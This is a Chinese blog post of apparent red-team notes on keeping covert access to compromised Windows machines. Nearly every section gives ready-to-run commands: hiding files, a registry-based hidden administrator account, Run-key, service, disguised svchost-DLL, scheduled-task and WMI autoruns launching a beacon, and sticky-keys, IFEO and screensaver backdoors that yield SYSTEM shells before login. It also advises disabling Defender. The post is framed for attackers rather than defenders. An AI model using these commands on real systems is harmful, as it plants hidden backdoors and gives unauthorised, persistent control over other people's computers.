---
title: "windows权限维持"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# windows权限维持

最主要就是想一些办法让我们的后门能够自主执行从而让我们一直拥有目标主机的权限，很多操作也类似于权限提升

### 文件特性

和linux一样，文件层面上看，有一些隐藏文件的方法

#### attrib

~~~cmd
attrib +s +a +h +r c:\test
~~~

s：设置系统属性（System） a：设置存档属性（Archive） h：设置隐藏属性（Hidden）

r：设置只读属性（Read-only）

![image-20241214202221388](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241214202221388.png)

如此即可进行隐藏

如果要查看，需要加上`/a`参数：

~~~cmd
dir /a
~~~

![image-20241214202400912](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241214202400912.png)

当然，删除对应属性也能重新显示出来：

~~~cmd
attrib -s -a -h -r c:\test
~~~

#### 系统图标隐藏

可以把文件夹的名称重命名为 `我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}`

这样，图标变成了我的电脑，双击也是可以到达我的电脑，不能进入查看我们文件夹的内容

此时，只能使用命令行查看和访问该文件夹：

![image-20241214203022480](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241214203022480.png)

常用的名称如下：

~~~markdown
我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
回收站.{645ff040-5081-101b-9f08-00aa002f954e}
拔号网络.{992CFFA0-F557-101A-88EC-00DD010CCC48}
打印机.{2227a280-3aea-1069-a2de-08002b30309d}
控制面板.{21ec2020-3aea-1069-a2dd-08002b30309d}
网上邻居.{208D2C60-3AEA-1069-A2D7-08002B30309D}
~~~

#### 畸形名称

创建文件名称为 `test...\` 显示名称是 `test...`

这个文件可以看到，但是不能访问内部文件，也不能删除

~~~cmd
md test...\
copy 1111.txt test...\
~~~

![image-20241214205248866](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241214205248866.png)

此时这个文件显示出来的名称为test...

![image-20241214211344172](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241214211344172.png)

以这个名称进行文件操作始终会失败：

* 命令行进入失败：

  ![image-20241214211417636](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241214211417636.png)

* 直接点也点不开，或者点开后里面的文件也无法打开：

  ![image-20241214211507821](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241214211507821.png)

* 无法直接删除：

  ![image-20241214211611921](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241214211611921.png)

如果想要删除该文件，可以如下操作：

~~~cmd
rd /s /q c:\test...\
~~~

- `/s` 表示递归地删除指定目录及所有子目录中的文件。
- `/q` 表示安静模式，即不提示确认直接删除。

![image-20241214211814139](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241214211814139.png)

#### 驱动级文件隐藏

驱动隐藏最典型的现象就是系统盘中存在以下文件：

~~~cmd
c:\WINDOWS\xlkfs.dat
c:\WINDOWS\xlkfs.dll
c:\WINDOWS\xlkfs.ini
c:\WINDOWS\system32\drivers\xlkfs.sys
~~~

驱动隐藏我们可以用Easy File Locker来实现

设置文件：只勾选Accessible，这样，该文件不会显示，不能通过列目录列出来，也不能删除，只有知道完整路径，才可以读取文件内容：

![image-20241214221822640](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241214221822640.png)

并且该软件还可以设置密码，启动、修改设置、卸载及重复安装的时候都需要密码，主界面、卸载程序等都可以删除，只留下核心的驱动文件就行

要想删除

* 查询服务状态：` sc qc xlkfs`
* 停止服务： `net stop xlkfs` 服务停止以后，经驱动级隐藏的文件即可显现
* 删除服务： `sc delete xlkfs`
* 删除系统目录下面的文件，重启系统，确认服务已经被清理了

### 系统后门

#### 影子账户

权限要求：需要提升至管理员+登录桌面

简单来说就是一个隐藏的账户，只能在注册表中找到

创建步骤如下：

* 创建”hacker$“用户：

  ~~~cmd
  net user hacker$ hacker@123 /add 
  ~~~

  这里的$表示隐藏账户，命令行已经无法查询到这个用户了，但是在控制面板、计算机管理的本地用户和组中依然可以看见该用户

* regedit打开注册表管理器，HKEY_LOCAL_MACHINE\SAM\SAM的administrator权限更改为完全控制：

  ![image-20241229160331350](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241229160331350.png)

* 进入HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\Administrator，找到和admin键值相同的目录：

  ![image-20241229160845151](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241229160845151.png)

* 复制该目录表项的F属性的值：

  ![image-20241229162306925](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241229162306925.png)

* 相同方法找到hacker$目录将复制的admin属性粘贴进F属性（这里其实是hacker$用户劫持了admin的RID，从而使hacker$获得了admin的权限）

  ![image-20241229162839274](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241229162839274.png)

* 将hacker$和对应的03EB表项导出

  ![image-20241229163353187](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241229163353187.png)

* 删除原来创建的用户：

  ~~~cmd
  net user hacker$ /del 
  ~~~

  ![image-20241229163451880](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241229163451880.png)

* 将导出的注册表项重新导回：

  ![image-20241229163732580](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241229163732580.png)

导入完成后，就算是创建完成了，影子账户拥有管理员权限，并且只在注册表中可见，命令行、查看本体用户和组都找不到该用户：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241229163945623.png" alt="image-20241229163945623" style="zoom:80%;" />

![image-20241229164053633](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241229164053633.png)

#### Startup目录

权限要求：不用提权

最常用也是最简单的权限维持，放在该目录下的程序或快捷方式会在用户登录时自动运行

自启动目录有两种写法，因windows版本而不同

NT6以后（即Windows Vista 及以后）的目录如下：

```
对当前用户有效：
C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
对所有用户有效：
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

NT6以前的目录如下：

```
对当前用户有效：
C:\Documents and Settings\Hunter\「开始」菜单\程序\启动
对所有用户有效：
C:\Documents and Settings\All Users\「开始」菜单\程序\启动
```

#### 注册键

权限要求：无需提权

注册表自启项也是比较常用的持久化操作

Windows在注册表中提供了两套独立的路径，一个是上面提到的当前用户的“HKEY_CURRENT_USER”即“HKCU”（改动不需要管理员权限），另一个就是针对当前用户物理状态的“HKEY_LOCAL_MACHINE”即“HKLM”，仅有特权账户可以对其进行修改。

随着安全意识的提高，目前在红队中搞到的Windows大多都是降权的。特别是钓鱼得到的PC机提权的意义不大，因为即使提权写了Administrator的启动项，用户下一次登录也还是进自己的账户，持久化就白做了

Windows下的所有注册键如下：

~~~
1.Load注册键
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Windows＼load

2.Userinit注册键
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Winlogon＼Userinit
通常该注册键下面有一个userinit.exe。该键允许指定用逗号分隔的多个程序，如userinit.exe,evil.exe。

3.Explorer＼Run注册键
Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run
Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。

4.RunServicesOnce注册键
RunServicesOnce注册键用来启动服务程序，启动时间在用户登录之前，而且先于其他通过注册键启动的程序，在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunServicesOnce
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼ Windows＼CurrentVersion＼RunServicesOnce

5.RunServices注册键
RunServices注册键指定的程序紧接RunServicesOnce指定的程序之后运行，但两者都在用户登录之前。
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼ RunServices
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼ CurrentVersion＼RunServices

6.RunOnce＼Setup注册键
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup

7.RunOnce注册键
安装程序通常用RunOnce键自动运行程序，它的位置在
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce
[小于NT6]HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnceEx
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce
HKEY_LOCAL_MACHINE下面的RunOnce键会在用户登录之后立即运行程序，运行时机在其他Run键指定的程序之前；HKEY_CURRENT_USER下面的RunOnce键在操作系统处理其他Run键以及“启动”文件夹的内容之后运行。

8.Run注册键
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Run
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Run
Run是自动运行程序最常用的注册键，HKEY_CURRENT_USER下面的Run键紧接HKEY_LOCAL_MACHINE下面的Run键运行，但两者都在处理“启动”文件夹之前。
~~~

写入注册键命令如下：
~~~cmd
reg add "XXXX" /v evil /t REG_SZ /d "[Absolute Path]\evil.exe"
~~~

#### 服务

权限要求：未降权的管理员权限

创建服务是需要非降权管理员权限的，因此拿到shell后要用这种方法做维持首先要提权，但其优点是隐蔽性比注册键高（如用svchost的服务组加载DLL就可以隐藏掉恶意进程）

##### cmd拉起

CMD和Powershell都可以用命令添加服务，样例如下：
~~~cmd
sc create evil binpath= "cmd.exe /k [Absolute Path]evil.exe" start= "auto" obj= "LocalSystem"
~~~

这里值得注意的是：shellcodeloader主线程会阻塞导致服务启动时认为程序无响应而失败，因此必须用cmd拉起来，不能直接创建服务

服务正常启动后进程以SYSTEM权限在用户登录前运行，但缺点也很明显，恶意进程还是独立存在的，任务管理器就能看见，隐蔽性较差

##### svchost启动

这种方法更加隐蔽，由于Windows系统中的许多服务都是通过注入到该程序中启动（这也是官方认可的DLL注入动作），因此只要DLL本身免杀，杀毒软件就不会理会这种行为，并且由于恶意进程并不是独立存在的，隐蔽性相对较高

但这个方法就没办法一行命令完成，不仅需要自己做一个服务DLL，还需要额外在注册表中添加一些东西。由于64位系统有两套注册表和两套svchost，因此命令还有微小的不同

* 32位：

  ~~~cmd
  sc create TimeSync binPath= "C:\Windows\System32\svchost.exe -k netsvr" start= auto obj= LocalSystem
  reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync\Parameters /v ServiceDll /t REG_EXPAND_SZ /d "C:\Users\hunter\Desktop\localService32.dll" /f /reg:32
  reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync /v Description /t REG_SZ /d "Windows Time Synchronization Service" /f /reg:32
  reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync /v DisplayName /t REG_SZ /d "TimeSyncSrv" /f /reg:32
  reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v netsvr /t REG_MULTI_SZ /d TimeSync /f /reg:32
  sc start TimeSync
  ~~~

* 64位：

  ~~~cmd
  sc create TimeSync binPath= "C:\Windows\System32\svchost.exe -k netsvr" start= auto obj= LocalSystem
  reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync\Parameters /v ServiceDll /t REG_EXPAND_SZ /d "C:\Users\hunter\Desktop\localService32.dll" /f /reg:64
  reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync /v Description /t REG_SZ /d "Windows Time Synchronization Service" /f /reg:64
  reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync /v DisplayName /t REG_SZ /d "TimeSyncSrv" /f /reg:64
  reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v netsvr /t REG_MULTI_SZ /d TimeSync /f /reg:64
  sc start TimeSync

**注意**：使用“reg add”命令向注册表键中添加数据的时候是直接覆盖的，而“HKLM\SOFTWARE\Microsoft\Windows  NT\CurrentVersion\Svchost”中的大多数的键都是REG_MULTI_SZ类型，即多行数据。因此千万不能直向已经存在的键中写入数据，系统启动所需要的服务都在里面，覆盖后会出大问题！（所以上面命令中是用的“netsvr”，这个键默认是不存在的）

#### 计划任务

权限要求：未降权的管理员权限/普通用户

计划任务也是一项很好的持久化利用点。不同于自启注册键和服务项，计划任务的设定方式更多样、灵活，位置也相对较为隐蔽（手工排查要多点几下）

Windows中有命令“SCHTASKS”用来管理计划任务，支持下面几个选项，在持久化过程中比较常用的命令是Create

当然，“计划任务程序库”中也是有路径的，比如这里还能看见我之前测试的smbshell：

![image-20241229153643875](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241229153643875.png)

为了确保隐蔽性，我们也可以遵守Windows默认的规范在“\Microsoft\Windows\”下面新建我们的子目录和计划任务。示例命令如下：
~~~cmd
SCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN \Microsoft\Windows\evil\eviltask /TR C:\Users\hunter\Desktop\evil.exe
~~~

这种情况无需用户登录即可收到反向连接

在进程树中，恶意进程是被taskeng.exe即任务计划程序引擎拉起的，隐蔽性弱于DLL服务，但强于自启注册键

**注意**：SCHTASKS命令功能并不完整，很多配置项是无法操作的，比如不支持同时创建多个触发器，不支持修改“条件”和“设置”选项卡中的功能，很多选项需要GUI来配置：

![image-20241229154050302](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241229154050302.png)

因此计划任务这个持久化的路子只能作为一个保险，并不能完全依赖

这里还有一个相似的利用点：组策略，在启动脚本处可以执行cmd脚本或ps脚本从而执行任意命令，但由于命令行版本的组策略编辑器功能太过受限，就不再做展开（如果可以登录桌面的话直接去gpedit.msc去配置启动脚本即可持久化，且隐蔽性较高）

### 事件触发执行

#### WMI

权限要求：未降权的管理员权限。
 我们可以认为WMI是一组可以直接与Windows操作系统交互的API，由于这是操作系统自带的工具，无需安装，因此也是权限维持的好帮手。
 由于WMI的事件会循环执行，为确保不会无限弹shell，可以使用系统启动时间来限制（只要触发延时可以落在限定区间即可，有些机器启动慢因此起始时间调高些）。示例命令如下：

~~~cmd
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="evil", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 310"

wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="evilConsumer", ExecutablePath="C:\Users\hunter\Desktop\beacon.exe",CommandLineTemplate="C:\Users\hunter\Desktop\beacon.exe"

wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"evil\"", Consumer="CommandLineEventConsumer.Name=\"evilConsumer\""
~~~

由于时间区间的落点不一定相同，特定情况下有可能会出现多个beacon，且在进程树中的隐蔽性一般

当然，市面上有很多自动化工具，这里就不多记录了

#### 利用系统辅助功能

权限要求：需要提升至administrator/trustedinstaller

为了使电脑更易于使用和访问，Windows 添加了一些辅助功能。这些功能可以在用户登录之前以组合键启动。根据这个特征，一些恶意软件无需登录到系统，通过远程桌面协议就可以执行恶意代码

比如最常见的按5下shift出现的粘滞键Sethc.exe，还有Windows + U组合键时启动的utilman.exe程序

他们都存在于`C:\Windows\System32\`中：

```
屏幕键盘： C:\Windows\System32\osk.exe
放大镜： C:\Windows\System32\Magnify.exe
旁白： C:\Windows\System32\Narrator.exe
显示切换器 C:\Windows\System32\DisplaySwitch.exe
应用切换器： C:\Windows\System32\AtBroker.exe
```

在较早的 Windows 版本，只需要进行简单的二进制文件替换，比如经典的shift后门是将C:\Windows\System32\sethc.exe替换为cmd.exe

但高版本的windows对`C:\Windows\System32\`下的文件进行了保护，需要trustedinstaller权限才能对其修改和写入，这里可以通过令牌窃取实现，然后我们可以进行替换：

~~~cmd
cd C:\Windows\System32\
move Sethc.exe Sethc.exe.bak
copy cmd.exe Sethc.exe
~~~

那么当我们RDP连接目标机时，即使没有登录，我们也可以通过按5下shift，使其弹出cmd窗口(并且为system权限)，实现未授权访问

而这里既然可以获取system权限的cmd，就当然可以尝试通过RDP劫持（在横向移动的笔记中）绕过登录进入桌面了

#### IFEO注入

权限要求：需要提升至administrator

上面提到修改`C:\Windows\System32\`目录需要trustedinstaller权限，那么如果令牌窃取失败了，还有办法利用辅助功能吗？答案就是IFEO注入

##### debugger

当我们双击运行程序时，系统会查询该IFEO注册表，如果发现存在和该程序名称完全相同的子键，就查询对应子健中包含的“debugger”键值名，如果该参数不为空，系统则会把 Debugger 参数里指定的程序文件名作为用户试图启动的程序执行请求来处理。这样成功执行的是遭到“劫持”的虚假程序

命令如下，这里将dubugger设置为要执行的程序即可，我这里以cmd为例：

~~~cmd
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe" /f
~~~

![image-20241229172806033](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241229172806033.png)

当然，记得关defender：

![image-20241229173957088](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241229173957088.png)

这样同样可以在RDP的时候，用未登录状态开启system权限的cmd：

![image-20241229174623975.png](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241229174623975.png)

##### globalflag

IFEO还可以在指定程序静默退出时启动任意监控程序，但需要设置3个注册表：

~~~cmd
# 启动对记事本进程的静默退出监视
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
# 启动Windows错误报告进程WerFault.exe，将成为reverse_tcp.exe的父进程
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
# 将监视器进程设为reverse_tcp.exe
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\Windows\System32\reverse_tcp.exe"  
~~~

当用户打开记事本（notepad.exe）时，程序正常启动。当用户关闭记事本或相关进程被杀死后，将在WerFault进程中创建子进程以运行后门程序reverse_tcp.exe

#### 屏幕保护程序

权限要求：普通用户

虽然未必所有用户都会使用屏幕保护，但幸运的是屏幕保护程序的相关配置都在注册表中，如下图的四个键：

```
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut
HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE
```

所以直接开启：

~~~cmd
# 将触发屏幕保护时执行的程序设为自定义的恶意程序，这里的程序以.scr或.exe均可
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\Users\Yuy0ung\desktop\artifact.exe" /f  
# 启用屏幕保护  
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d "1" /f  
# 设置不需要密码解锁  
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d "0" /f  
# 将用户不活动的超时设为60秒  
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "60" /f
~~~

![image-20241229180535013](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241229180535013.png)

一段时间后，屏保会开启，触发后门，实现权限维持

#### DLL劫持

权限要求：提权至administrator

和我之前文章中linux的so共享库劫持是同样的原理

DLL劫持漏洞之所以被称为漏洞，还要从负责加载DLL的系统API LoadLibrary 来看。因为调⽤ LoadLibrary 时可以使⽤DLL的相对路径，这时，系统会按照特定的顺序搜索⼀ 些⽬录，以确定DLL的完整路径。根据MSDN⽂档的约定，在使⽤相对路径调⽤ LoadLibrary （同样适 ⽤于其他同类DLL LoadLibraryEx，ShellExecuteEx等）时，系统会依次从以下6个位置去查找所需要的 DLL⽂件（会根据SafeDllSearchMode配置⽽稍有不同）。

1. 程序所在⽬录
2. 加载 DLL 时所在的当前⽬录
3. 系统⽬录即 SYSTEM32 ⽬录
4. 16位系统⽬录即 SYSTEM ⽬录
5. Windows⽬录
6. PATH环境变量中列出的⽬录

dll劫持就发⽣在系统按照顺序搜索这些特定⽬录时。只要⿊客能够将恶意的DLL放在优先于正常DLL所在的⽬录，就能够欺骗系统优先加载恶意DLL，来实现“劫持”

在win7及win7以上系统增加了KnownDLLs保护，需要在如下注册表下添加dll才能顺利劫持：

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDlls
```

### 域后门

内容放在我的域渗透文章中